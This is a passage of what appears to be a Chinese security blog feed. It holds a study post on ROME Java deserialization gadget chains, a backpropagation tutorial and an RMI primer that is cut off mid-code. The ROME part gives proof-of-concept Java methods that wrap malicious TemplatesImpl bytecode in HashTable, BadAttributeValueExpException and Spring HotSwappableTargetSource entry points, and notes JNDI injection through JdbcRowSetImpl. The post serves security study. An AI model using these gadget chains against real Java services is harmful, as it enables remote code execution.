title="HashTable利用链"></a>HashTable利用链</h3><p>HashTable利用链其实并不是针对ROME的利用链。其作用是替换作为反序列化入口的HashMap类，如果漏洞过滤了HashMap类，我们就可以使用HashTable类进行替换。<br>在HashTable中的readObject中<br><img src="/img/4-11/11.png"><br>跟进reconstitutionPut<br><img src="/img/4-11/12.png"><br>调用key的hashCode，后面的链子不变，这里只是换了个入口点</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token class-name">Object</span> <span class="token class-name">HashTableGadget</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span> <span class="token punctuation">{</span><span class="token class-name">TemplatesImpl</span> templates <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">TemplatesImpl</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">Reflect</span><span class="token punctuation">.</span><span class="token function">setValue</span><span class="token punctuation">(</span>templates<span class="token punctuation">,</span><span class="token string">"_name"</span><span class="token punctuation">,</span><span class="token string">"aaa"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">Reflect</span><span class="token punctuation">.</span><span class="token function">setValue</span><span class="token punctuation">(</span>templates<span class="token punctuation">,</span><span class="token string">"_bytecodes"</span><span class="token punctuation">,</span><span class="token keyword">new</span> <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span><span class="token class-name">EvilClassTable<span class="token punctuation">.</span>TemplateClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">Reflect</span><span class="token punctuation">.</span><span class="token function">setValue</span><span class="token punctuation">(</span>templates<span class="token punctuation">,</span><span class="token string">"_tfactory"</span><span class="token punctuation">,</span><span class="token keyword">new</span> <span class="token class-name">TransformerFactoryImpl</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">ToStringBean</span> toStringBean <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ToStringBean</span><span class="token punctuation">(</span><span class="token class-name">Templates</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span> templates<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">ObjectBean</span> objectBean <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ObjectBean</span><span class="token punctuation">(</span><span class="token class-name">ToStringBean</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span> toStringBean<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">Hashtable</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Object</span><span class="token punctuation">,</span> <span class="token class-name">Object</span><span class="token punctuation">&gt;</span></span> hashTable <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Hashtable</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token punctuation">&gt;</span></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>hashTable<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span>objectBean<span class="token punctuation">,</span><span class="token number">123</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">return</span> hashTable<span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p><a name="uejQ0"></a></p><h3 id="BadAttributeValueExpException利用链"><a href="#BadAttributeValueExpException利用链" class="headerlink" title="BadAttributeValueExpException利用链"></a>BadAttributeValueExpException利用链</h3><p>在cc5中<br>BadAttributeValueExpException这个类。在其readObject()中能够调用任意类的toSrting()方法。<br><img src="/img/4-11/13.png"><br>那把入口点直接改成BadAttributeValueExpException即可，直接调用到<br>ToStringBean的toString方法<br>看看构造方法<br><img src="/img/4-11/14.png"><br>这样就需要反射赋值了，否则val为String而不是Object</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token class-name">Object</span> <span class="token class-name">BadAttributeValueExpExceptionGadget</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">throws</span> <span class="token class-name">Exception</span><span class="token punctuation">{</span><span class="token class-name">TemplatesImpl</span> templates <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">TemplatesImpl</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">Reflect</span><span class="token punctuation">.</span><span class="token function">setValue</span><span class="token punctuation">(</span>templates<span class="token punctuation">,</span><span class="token string">"_name"</span><span class="token punctuation">,</span><span class="token string">"aaa"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">Reflect</span><span class="token punctuation">.</span><span class="token function">setValue</span><span class="token punctuation">(</span>templates<span class="token punctuation">,</span><span class="token string">"_bytecodes"</span><span class="token punctuation">,</span><span class="token keyword">new</span> <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span><span class="token class-name">EvilClassTable<span class="token punctuation">.</span>TemplateClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">Reflect</span><span class="token punctuation">.</span><span class="token function">setValue</span><span class="token punctuation">(</span>templates<span class="token punctuation">,</span><span class="token string">"_tfactory"</span><span class="token punctuation">,</span><span class="token keyword">new</span> <span class="token class-name">TransformerFactoryImpl</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">ToStringBean</span> toStringBean <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ToStringBean</span><span class="token punctuation">(</span><span class="token class-name">Templates</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span> templates<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">BadAttributeValueExpException</span> expException <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">BadAttributeValueExpException</span><span class="token punctuation">(</span><span class="token number">123</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">Reflect</span><span class="token punctuation">.</span><span class="token function">setValue</span><span class="token punctuation">(</span>expException<span class="token punctuation">,</span><span class="token string">"val"</span><span class="token punctuation">,</span>toStringBean<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">return</span> expException<span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p><a name="XPyBK"></a></p><h3 id="HotSwappableTargetSource利用链"><a href="#HotSwappableTargetSource利用链" class="headerlink" title="HotSwappableTargetSource利用链"></a>HotSwappableTargetSource利用链</h3><p>这条是spring原生的toString利用链，调用链如下</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token operator">*</span> <span class="token class-name">HashMap</span><span class="token punctuation">.</span>readObject<span class="token operator">*</span> <span class="token class-name">HashMap</span><span class="token punctuation">.</span>putVal<span class="token operator">*</span> <span class="token class-name">HotSwappableTargetSource</span><span class="token punctuation">.</span>equals<span class="token operator">*</span> <span class="token class-name">XString</span><span class="token punctuation">.</span>equals<span class="token operator">*</span> <span class="token class-name">ToStringBean</span><span class="token punctuation">.</span>toString</code></pre><p>需要有Spring-aop依赖<br>poc</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token class-name">Object</span> <span class="token class-name">HotSwappableTargetSourceGadget</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">throws</span> <span class="token class-name">Exception</span><span class="token punctuation">{</span><span class="token class-name">TemplatesImpl</span> templates <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">TemplatesImpl</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">Reflect</span><span class="token punctuation">.</span><span class="token function">setValue</span><span class="token punctuation">(</span>templates<span class="token punctuation">,</span><span class="token string">"_name"</span><span class="token punctuation">,</span><span class="token string">"aaa"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">Reflect</span><span class="token punctuation">.</span><span class="token function">setValue</span><span class="token punctuation">(</span>templates<span class="token punctuation">,</span><span class="token string">"_bytecodes"</span><span class="token punctuation">,</span><span class="token keyword">new</span> <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span><span class="token class-name">EvilClassTable<span class="token punctuation">.</span>TemplateClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">Reflect</span><span class="token punctuation">.</span><span class="token function">setValue</span><span class="token punctuation">(</span>templates<span class="token punctuation">,</span><span class="token string">"_tfactory"</span><span class="token punctuation">,</span><span class="token keyword">new</span> <span class="token class-name">TransformerFactoryImpl</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">ToStringBean</span> toStringBean <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ToStringBean</span><span class="token punctuation">(</span><span class="token class-name">Templates</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span> templates<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">HotSwappableTargetSource</span> h1 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">HotSwappableTargetSource</span><span class="token punctuation">(</span>toStringBean<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">HotSwappableTargetSource</span> h2 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">HotSwappableTargetSource</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">XString</span><span class="token punctuation">(</span><span class="token string">"xxx"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">HashMap</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Object</span><span class="token punctuation">,</span><span class="token class-name">Object</span><span class="token punctuation">&gt;</span></span> hashMap <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">HashMap</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token punctuation">&gt;</span></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>hashMap<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span>h1<span class="token punctuation">,</span>h1<span class="token punctuation">)</span><span class="token punctuation">;</span>hashMap<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span>h2<span class="token punctuation">,</span>h2<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">return</span> hashMap<span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>HashMap#putVal<br>HashMap反序列化一个节点的key，和value后就会放入hashmap中<br>后面的元素的key肯定要跟前面的比较是否key重复<br><img src="/img/4-11/15.png"></p><p>跟进HotSwappableTargetSource#equal<br><img src="/img/4-11/16.png"><br>当两个节点的key都是HotSwappableTargetSource时,就会比较target<br>前面那个的target为XString<br>进入Xstring#equal<br><img src="/img/4-11/17.png"><br>可以看到会调用后面那个的toSting,因此hashmap前面的key中的target为toStingBean<br>那就接着后面的链子<br>因此2个节点放入hashmap中的顺序也很重要<br>会走第二个放入的equal方法，第二个包装的应该是Xtring,第一个包装的是ToStingBean<br><a name="pQ7VA"></a></p><h3 id="JdbcRowSetImpl利用链"><a href="#JdbcRowSetImpl利用链" class="headerlink" title="JdbcRowSetImpl利用链"></a>JdbcRowSetImpl利用链</h3><p>JdbcRowSetImpl利用链是针对后半段TemplatesImpl.getOutputProperties()任意类加载进行替换的。JdbcRowSetImpl利用链的结果是能造成JNDI注入，于是下面就可以配合RMI或者LDAP服务进行攻击了。<br>由于JDNI注入中trustURLCodebase的限制，这里限制的攻击版本为</p><ul><li>RMI：JDK 6u132、JDK 7u122、JDK 8u113之前</li><li>LDAP：JDK 7u201、8u191、6u211、JDK 11.0.1之前</li></ul><p>我们知道，在Fastjson反序列化漏洞中能造成JNDI注入的同样是JdbcRowSetImpl这条链。问题出在JdbcRowSetImpl.getDatabaseMetaData()这个getter上<br><img src="/img/4-11/18.png"><br>connect中有使用lookup<br><img src="/img/4-11/19.png"></p><p><a name="NUrGH"></a></p><h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><ul><li><a href="https://goodapple.top/archives/1145">Java安全学习——ROME反序列化 - 枫のBlog</a></li><li><a href="https://cjlusec.ldxk.edu.cn/2023/02/15/rome/">https://cjlusec.ldxk.edu.cn/2023/02/15/rome/</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> java安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> java安全 </tag>
            
            <tag> 反序列化 </tag>
            
            <tag> rome </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>反向传播</title>
      <link href="/2024/03/25/%E5%8F%8D%E5%90%91%E4%BC%A0%E6%92%AD/"/>
      <url>/2024/03/25/%E5%8F%8D%E5%90%91%E4%BC%A0%E6%92%AD/</url>
      
        <content type="html"><![CDATA[<h1 id="反向传播"><a href="#反向传播" class="headerlink" title="反向传播"></a>反向传播</h1><p><a name="SMMHj"></a></p><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p><a href="https://zh.wikipedia.org/wiki/%E5%8F%8D%E5%90%91%E4%BC%A0%E6%92%AD%E7%AE%97%E6%B3%95">反向传播</a>（英语：Backpropagation，缩写为BP）是“误差反向传播”的简称，是一种与最优化方法（如梯度下降法）结合使用的，用来<strong>训练人工神经网络</strong>的常见方法。该方法对网络中所有权重<strong>计算损失函数的梯度</strong>。这个梯度会反馈给最优化方法，用来更新权值以最小化损失函数。<br>反向传播要求有对每个输入值想得到的已知输出，来计算损失函数梯度。因此，它通常被认为是一种监督式学习方法，虽然它也用在一些无监督网络（如自动编码器）中。它是多层前馈网络的Delta规则的推广，可以用<strong>链式法则</strong>对每层迭代计算梯度。反向传播要求人工神经元（或“节点”）的<strong>激励函数</strong>可微。</p><p><a name="RbIqB"></a></p><h2 id="梯度下降与损失函数"><a href="#梯度下降与损失函数" class="headerlink" title="梯度下降与损失函数"></a>梯度下降与损失函数</h2><p>  损失函数，(Loss Function）在机器学习中的每一种算法中都很重要，因为训练模型的过程就是优化损失函数的过程，损失函数对每个参数的偏导数就是梯度下降中提到的梯度，防止过拟合时添加的正则化项也是加在损失函数后面的。<br>损失函数非常好理解，我觉得其实就是，反映神经网络输出的结果与训练样本的y之间的差别的函数（其中输入变量是神经网络的权重参数）。这个函数要具有一些特性，一般情况下，我们要尽可能的最小化损失函数，寻找损失函数的全局最小值，</p><p>为了完成梯度下降<br><img src="/img/3-25/1.svg"><br>我们需要求偏导</p><p><a name="epX0a"></a></p><h2 id="过程"><a href="#过程" class="headerlink" title="过程"></a>过程</h2><p>数学原理：基于复合函数求导的链式法则–<br>如果某个函数由复合函数表示，则该复合函数的导数可以用构成复合函数的各个函数的导数的乘积表示；</p><p><a name="Lqqst"></a></p><h3 id="简单线性回归"><a href="#简单线性回归" class="headerlink" title="简单线性回归"></a>简单线性回归</h3><p>假设是 y=wx+b<br>其损失函数为<br><img src="/img/3-25/2.svg"></p><ul><li>随机初始化参数 w,b</li><li>将w,b视为变量，x,y为常量</li><li>根据梯度下降,更新w,b</li></ul><p><img src="/img/3-25/3.svg">、<br><img src="/img/3-25/4.svg"><br>因此需计算出<img src="/img/3-25/5.svg">、<img src="/img/3-25/6.svg"><br>易得<img src="/img/3-25/7.svg">= x  ,  <img src="/img/3-25/8.svg"> = 1<br>上面其实是现在的需求，根据链式法则<br><img src="/img/3-25/9.svg"><br><img src="/img/3-25/10.svg"></p><p>如下图，已知数据(1.5,0.8)，初始化参数w=0.8,b=0.2<br>一轮运算后得到预测值y=1.4<br>如果先得出<img src="/img/3-25/11.svg">,接着往下运算得到目标结果<br><img src="/img/3-25/12.png"><br>根据上图，<img src="/img/3-25/13.svg">= y - <img src="/img/3-25/14.svg">其中<img src="/img/3-25/15.svg">为真实值，y是预测值，根据上面一轮的正向传播（即根据给定的模型计算得出），得到<img src="/img/3-25/16.svg">=1.4 -0.8 = 0.6<br><img src="/img/3-25/17.png"><br>然后<img src="/img/3-25/18.svg">=0.6 x 1.5= 0.9   <img src="/img/3-25/19.svg">=0.6<br>然后设置学习率<img src="/img/3-25/20.svg">=0.1 <br>更新w,b   w=0.8-0.1 x 0.9 = 0.71    b=0.2-0.1 x 0.6=0.14<br>然后照此迭代模型<br>这样由后往前地求偏导就是反向传播的过程，</p><p><a name="Qta8E"></a></p><h3 id="神经网络"><a href="#神经网络" class="headerlink" title="神经网络"></a>神经网络</h3><p>在一个神经网络中，其实就是上面简单线性回归变得稍微复杂，多加上了几层<br><img src="/img/3-25/21.png"><br>反向传播，根据上面一步的运算求出下一层次的偏导<br>就如上图，黄色部分其实都是已经由之前的运算得出<br>反向传播算法就是神经网络中加快计算梯度值的方法<br><a name="jHjGe"></a></p><h2 id="计算图"><a href="#计算图" class="headerlink" title="计算图"></a>计算图</h2><p>计算机中的运算并非就是上面图示的过程，因为很难对一个式子求偏导<br>，所以需要将式子拆开，由一个运算符连接得到计算图</p><p>计算图将计算过程用图形表示出来，这里的图形是指数据结构图，通过多个节点和边表示<br>用计算图解题时，需要按如下流程进行:</p><ul><li>构建计算图；</li><li>在计算图上从左到右进行计算(正向传播, forward propagation)；</li><li>在计算图上从右到左进行计算(反向传播, backward propagation)；<ul><li>将上游传过来的值E乘以节点的局部导数 <img src="/img/3-25/22.svg">，然后将结果传递给下一个节点</li></ul></li></ul><p>计算图的优点:</p><ul><li>局部计算；<ul><li>无论全局多么复杂的计算，都可以通过局部计算使各个节点致力于简单的计算，从而简化问题；</li></ul></li><li>利用计算图可以将中间的计算结果保存起来；</li><li>可以通过反向传播高效计算导数；</li><li>综上:可以通过正向传播和反向传播高效地计算各个变量的导数值；</li></ul><img src="/img/3-25/23.png"><p>由计算图，可以定义每中运算的数据结构<br>如在Pytourch中乘法运算可以如下定义：</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> torch<span class="token punctuation">.</span>autograd<span class="token keyword">class</span> <span class="token class-name">Multiply</span><span class="token punctuation">(</span>torch<span class="token punctuation">.</span>autograd<span class="token punctuation">.</span>Function<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token decorator annotation punctuation">@staticmethod</span>    <span class="token keyword">def</span> <span class="token function">forward</span><span class="token punctuation">(</span>ctx<span class="token punctuation">,</span>x<span class="token punctuation">,</span>y<span class="token punctuation">)</span><span class="token punctuation">:</span>        ctx<span class="token punctuation">.</span>save_for_backward<span class="token punctuation">(</span>x<span class="token punctuation">,</span>y<span class="token punctuation">)</span>        z <span class="token operator">=</span> x <span class="token operator">*</span> y        <span class="token keyword">return</span> z        <span class="token decorator annotation punctuation">@staticmethod</span>    <span class="token keyword">def</span> <span class="token function">backward</span><span class="token punctuation">(</span>ctx<span class="token punctuation">,</span>grad_z<span class="token punctuation">)</span><span class="token punctuation">:</span>        x<span class="token punctuation">,</span>y<span class="token operator">=</span>ctx<span class="token punctuation">.</span>save_tensors        grad_x <span class="token operator">=</span> grad_z <span class="token operator">*</span> y        grad_y <span class="token operator">=</span> grad_z <span class="token operator">*</span> x        <span class="token keyword">return</span> grad_x<span class="token punctuation">,</span>grad_y</code></pre><p>forward函数是前向传播，计算 z =x * y<br>backward函数是反向传播 ，由参数grad_z （由上一级的梯度<img src="/img/3-25/24.svg">）计算对x,y的偏导<br>由于z= x*y<br>因此<br><img src="/img/3-25/25.svg"><br><img src="/img/3-25/26.svg"><br></p><p><img src="/img/3-25/27.png"><br></p>]]></content>
      
      
      
        <tags>
            
            <tag> 机器学习 </tag>
            
            <tag> 深度学习 </tag>
            
            <tag> 神经网络 </tag>
            
            <tag> 算法 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>RMI机制</title>
      <link href="/2024/03/18/RMI%E6%9C%BA%E5%88%B6/"/>
      <url>/2024/03/18/RMI%E6%9C%BA%E5%88%B6/</url>
      
        <content type="html"><![CDATA[<h1 id="RMI机制"><a href="#RMI机制" class="headerlink" title="RMI机制"></a>RMI机制</h1><p><a name="TME8K"></a></p><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p> RMI（Remote Method Invocation）为远程方法调用，是允许运行在一个Java虚拟机的对象调用运行在另一个Java虚拟机上的对象的方法。 这两个虚拟机可以是运行在相同计算机上的不同进程中，也可以是运行在<strong>网络上的不同计算机中,<strong>它的底层是由</strong>socket</strong>和<strong>java序列化和反序列化</strong>支撑起来的。  <br>它使客户机上运行的程序可以调用远程服务器上的对象。远程方法调用特性使Java编程人员能够在网络环境中分布操作。RMI全部的宗旨就是尽可能简化远程接口对象的使用。</p><p>我们知道远程过程调用（Remote Procedure Call, RPC）可以用于一个进程调用另一个进程（很可能在另一个远程主机上）中的过程，从而提供了过程的分布能力。Java 的 RMI 则在 RPC 的基础上向前又迈进了一步，即提供分布式对象间的通讯。</p><p>RMI依赖的通信协议为JRMP(Java Remote Message Protocol ，Java 远程消息交换协议)，该协议为Java定制，要求服务端与客户端都为Java编写。这个协议就像HTTP协议一样，规定了客户端和服务端通信要满足的规范。在RMI中对象是通过序列化方式进行编码传输的。</p><ul><li>Client-客户端：客户端调用服务端的方法</li><li>Server-服务端：远程调用方法对象的提供者，也是代码真正执行的地方，执行结束会返回给客户端一个方法执行的结果</li><li>Registry-注册中心：其实本质就是一个map，相当于是字典一样，用于客户端查询要调用的方法的引用（在低版本的JDK中，Server与Registry是可以不在一台服务器上的，而在高版本的JDK中，Server与Registry只能在一台服务器上，否则无法注册成功）</li></ul><p><a name="n8uMy"></a></p><h2 id="RMI"><a href="#RMI" class="headerlink" title="RMI"></a>RMI</h2><p><a name="Pz24A"></a></p><h3 id="远程对象调用过程"><a href="#远程对象调用过程" class="headerlink" title="远程对象调用过程"></a>远程对象调用过程</h3><p>在JVM之间通信时，RMI对远程对象和非远程对象的处理方式是不一样的，它并没有直接把远程对象复制一份传递给客户端，而是传递了一个远程对象的Stub（存根），Stub相当于远程对象的引用或者代理。Stub对开发者是透明的，客户端可以像调用本地方法一样直接通过它来调用远程方法。Stub中包含了远程对象的定位信息，如Socket端口、服务端主机地址等等，并实现了远程调用过程中具体的底层网络通信细节。而位于服务器端的Skeleton（骨架）,能够读取客户端传递的方法参数，调用服务器方的实际对象方法， 并接收方法执行后的返回值。所以RMI远程调用逻辑大致是这样的<br><img src="/img/3-18/1.png"><br>从逻辑上来看，数据是在Client和Server之间横向流动的，但是实际上是从Client到Stub，然后从Skeleton到Server这样纵向流动的。</p><p>具体的通信流程如下</p><ul><li>Server监听一个端口，这个端口是JVM随机选择的</li><li>Client并不知道Server远程对象的通信地址和端口，但是位于Client的Stub中包含了这些信息，并封装了底层网络操作。Client可以调用Stub上的方法，并且也可以向Stub发送方法参数。</li><li>Stub连接到Server监听的通信端口并提交参数</li><li>Server执行具体的方法，并将结果返回给Stub</li><li>Stub返回执行结果给Client。因此在Clinet看来，就好像是Stub在本地执行了这个方法。</li></ul><p>位于Client上的Stub获取到远程Server的通信信息的需要使用RMI Registry了<br><a name="wkAXR"></a></p><h3 id="RMI-Registry"><a href="#RMI-Registry" class="headerlink" title="RMI Registry"></a>RMI Registry</h3><p><a name="v3OhM"></a></p><h4 id="RMI-Registry的注册"><a href="#RMI-Registry的注册" class="headerlink" title="RMI Registry的注册"></a>RMI Registry的注册</h4><p>JDK提供了一个RMI注册表（RMI Registry）来解决这个问题。RMI Registry也是一个远程对象，默认监听在1099端口上，可以使用代码启动RMI Registry，也可以使用rmiregistry命令。<br>要注册远程对象，需要RMI URL和一个远程对象的引用，如：</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">private</span> <span class="token keyword">void</span> <span class="token function">register</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span><span class="token punctuation">{</span>        <span class="token class-name">RMIHello</span> rmiHello<span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">RMIHello</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">LocateRegistry</span><span class="token punctuation">.</span><span class="token function">createRegistry</span><span class="token punctuation">(</span><span class="token number">1099</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">Naming</span><span class="token punctuation">.</span><span class="token function">bind</span><span class="token punctuation">(</span><span class="token string">"rmi://127.0.0.1:1099/hello"</span><span class="token punctuation">,</span>rmiHello<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span></code></pre><p>上面代码使用 LocateRegistry.createRegistry(port)在本地的某个端口上创建了一个Registry。最后使用Naming.bind()将实例化对象和地址上的hello绑定在一起，作为远程对象的名字。注意这里使用的是rmi://协议。<br><a name="Halo8"></a></p><h4 id="RMI-Registry的使用"><a href="#RMI-Registry的使用" class="headerlink" title="RMI Registry的使用"></a>RMI Registry的使用</h4><p>注册完RMI Registry以后，我们将要调用的远程对象已经和服务器端的某个地址绑定在了一起。</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">learn<span class="token punctuation">.</span>rmi</span><span class="token punctuation">;</span> <span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>rmi<span class="token punctuation">.</span>registry<span class="token punctuation">.</span></span><span class="token class-name">LocateRegistry</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>rmi<span class="token punctuation">.</span>registry<span class="token punctuation">.</span></span><span class="token class-name">Registry</span></span><span class="token punctuation">;</span> <span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">RMIClient</span> <span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span><span class="token punctuation">{</span>        <span class="token class-name">Registry</span> registry<span class="token operator">=</span> <span class="token class-name">LocateRegistry</span><span class="token punctuation">.</span><span class="token function">getRegistry</span><span class="token punctuation">(</span><span class="token string">"127.0.0.1"</span><span class="token punctuation">,</span><span class="token number">1099</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">IHello</span> iHello<span class="token operator">=</span><span class="token punctuation">(</span><span class="token class-name">IHello</span><span class="token punctuation">)</span> registry<span class="token punctuation">.</span><span class="token function">lookup</span><span class="token punctuation">(</span><span class="token string">"hello"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>iHello<span class="token punctuation">.</span><span class="token function">sayHello</span><span class="token punctuation">(</span><span class="token string">"Feng"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><p>LocateRegistry.getRegistry()会使用给定的主机和端口等信息在本地创建一个Stub对象作为Registry远程对象的代理，从而启动整个远程调用逻辑。服务端应用程序可以向RMI注册表中注册远程对象，然后客户端向RMI注册表查询某个远程对象名称，来获取该远程对象的Stub。这里我们使用了registry.lookup()来查询获取注册表中的远程对象。还有另一种写法<br>使用了RMI Registry后，RMI的调用关系如下<br><img src="/img/3-18/2.png"><br>RMI调用流程<br>从客户端角度看，服务端应用是有两个端口的，一个是RMI Registry端口（默认为1099），另一个是远程对象的通信端口（随机分配的）。更详细的通信过程如下<br><img src="/img/3-18/3.png"></p><p><a name="ROLIm"></a></p><h3 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h3><p>使用远程方法调用，必然会涉及参数的传递和执行结果的返回。参数或者返回值可以是基本数据类型，当然也有可能是对象的引用。所以这些需要被传输的对象必须可以被序列化，这要求相应的类必须实现java.io.Serializable接口，并且客户端的serialVersionUID字段要与服务器端保持一致。</p><p>任何可以被远程调用方法的对象必须继承java.rmi.Remote接口，远程对象的实现类必须继承UnicastRemoteObject类。如果不继承UnicastRemoteObject类，则需要手工初始化远程对象，在远程对象的构造方法的调用UnicastRemoteObject.exportObject()静态方法，如下：</p><ol><li><p>定义远程服务对象接口并继承Remote接口，需要将远程调用的方法定义在接口里面，并必须抛出RemoteException(否则会报错)</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">com<span class="token punctuation">.</span>yyjccc<span class="token punctuation">.</span>jndi<span class="token punctuation">.</span></span><span class="token constant">RMI</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>rmi<span class="token punctuation">.</span></span><span class="token class-name">Remote</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>rmi<span class="token punctuation">.</span></span><span class="token class-name">RemoteException</span></span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">interface</span> <span class="token class-name">RMIService</span> <span class="token keyword">extends</span> <span class="token class-name">Remote</span> <span class="token punctuation">{</span><span class="token keyword">public</span> <span class="token class-name">String</span> <span class="token function">say</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">RemoteException</span><span class="token punctuation">;</span><span class="token 